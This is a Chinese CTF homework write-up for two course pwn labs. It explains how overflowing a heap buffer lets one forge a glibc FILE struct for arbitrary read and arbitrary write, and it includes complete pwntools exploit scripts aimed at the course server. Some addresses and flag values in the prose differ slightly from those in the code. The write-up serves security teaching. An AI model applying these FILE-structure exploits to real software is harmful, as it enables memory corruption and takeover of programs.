# 2022 Computer Security HW8 Writeup - Pwn

[![hackmd-github-sync-badge](https://hackmd.io/YSOLbi79QWaq6TEt-T6HnQ/badge)](https://hackmd.io/YSOLbi79QWaq6TEt-T6HnQ)

* [HW8 github (Writeup and Payload)](https://github.com/fdff87554/Computer-Security-2022/tree/main/homework/Homework-08)


## FILE_AAR - LAB

* 觀察了一下題目，可以發現可以利用的部分是 `buf` 這個參數，因為其只有 malloc `0x10` 這個大小卻在下面 read 了 `0x1000` 的資料，這會造成對 `fp` 內容的 overwrite，允許我們任意建構 `FILE` struct 的內容，因此我們的目標為 **任意讀取 (AAR)** 到 `flag`，並且將資料印出到 `stdout` (or `stderr`)。
* 這邊先用 `checksec` 來檢查檔案的安全性設定，可以看到沒有 `PIE` 跟 `STACK CANARY`，所以首先等於可以用 `objdump` or `ida` 先直接看記憶體位置 (絕對位置)，然後可以不用考慮 Leak Canary 的問題。
    > ![](https://i.imgur.com/zZzPJ3D.png)
* 因為上課有提過 `malloc` 的 `buf` 跟 `fp` 的 chunk 會連著，所以可以直接蓋到 `fp` 的內容，並且根據投影片敘述的 `FILE` 結構我們可以堆出我們想要的值。
    > ![](https://i.imgur.com/NCw5lTN.png)
    > ![](https://i.imgur.com/PNk0oSt.png)
* 而因為 `flags` 的結果是 `0xfbad0800`
    * `flags &= ~NO_WRITES` 為 unset `NO_WRITES`，讓其可寫入。
    * `flags |= (MAGIC | CURRENTLY_PUTTING)` 為確定結構正常的 (`MAGIC`) 和目前正在寫入 (`CURRENT_PUTTING`)。
    * `read_end = write_base = <target_address>` 是為了不讓讀寫的區域重疊。
    * 找到了 `target_address` 為 `flag` 的 address (如下圖) 之後，就可以建構我的們 chunk 跟 payload 了
        > ![](https://i.imgur.com/56Gcnk2.png)
        ```python=
        from pwn import *

        context.arch = 'amd64'
        r = remote("edu-ctf.zoolab.org", 10010)

        flag_addr = 0x0404050

        # chunk
        fake_chunk = flat(
            b'aaaaaaaa', b'aaaaaaaa',  # buf data
            b'aaaaaaaa', 0xc0,
            0xfbad0800,                # flags
            0x0,	                   # read_ptr
            flag_addr,	               # read_end
            0x0,	                   # read_base
            flag_addr,	               # write_base
            flag_addr + 0x100,	       # write_ptr
            0x0,	                   # write_end
            0x0,	                   # buf_base
            0x0,	                   # buf_end
            0x0, 0x0, 
            0x0, 0x0,
            0x0,	                   # chain
            0x1,	                   # fileno 
        )

        r.send(fake_chunk)
        r.interactive()
        ```
        > ![](https://i.imgur.com/g8vqmSK.png)
* 可以拿到 flag: `FLAG{QAQ...}`


## FILE_AAW - LAB

* 觀察題目可以看到一樣是 `buf` 可以 overflow 來覆寫 `fp` 的內容的 code，其目標是只要 `owo` 這個變數的內容不等於 `OWO!`，就會把 `flag` 顯示給我們看了，因此目標就是覆蓋到 `owo` 的資料。
* 今天目標是 **任意撰寫 (AAW)** 代表把從 stdin 的資料寫到特定地址，所以要控制的是 fread 的執行流程。一樣看一下 ppt 截圖的環境設置部分
    > ![](https://i.imgur.com/rwfuy51.png)
* 起手式一樣先檢查檔案有哪些保護，從下列截圖可以看到一樣沒有 PIE 跟 CANARY，所以一樣可以用 `objdump` or `ida` 先直接看記憶體位置 (絕對位置)，然後可以不用考慮 Leak Canary 的問題。
    > ![](https://i.imgur.com/J9Bw9Jy.png)
    * 其中 `flags` 的結果一樣是 `0xfbad000`
        * `flags &= ~(NO_READ | EOF_SEEN)` 為 unset，這兩個的意思就是讓他可以讀和沒有吃到 EOF
    * 一樣用 IDA 直接開找到目標 address 如下圖為 `0x0404060`
        > ![](https://i.imgur.com/r5cqiMw.png)
* 找到了 `target_address` 為 `owo` 的 address (如上圖) 之後，就可以依照上面一提的邏輯建構 chunk 跟 payload 了。
    ```python=
    from pwn import *

    context.arch = 'amd64'
    r = remote("edu-ctf.zoolab.org", 10009)

    owo_addr = 0x0404070

    fake_chunk = flat(
        b'aaaaaaaa', b'aaaaaaaa',    # buf data
        b'aaaaaaaa', 0xc0,
        0xfbad0000,                  # flags
        0x0,	                     # read_ptr
        0x0,	                     # read_end
        0x0,	                     # read_base
        owo_addr,	                 # write_base
        0x0,	                     # write_ptr
        0x0,	                     # write_end
        owo_addr,	                 # buf_base
        owo_addr + 0x100,	         # buf_end
        0x0, 0x0, 
        0x0, 0x0,
        0x0,	                     # chain
        0x0,	                     # fileno 
    )

    r.send(fake_chunk)
    r.interactive()
    ```
    > ![](https://i.imgur.com/840GQLa.png)
* 可以拿到 flag: `FLAG{sushi}`


---
###### tags: `CyberSec` `Writeup` `2022`

<style>
.navbar-brand::after { content: " × Crazyfire Lee"; }
</style>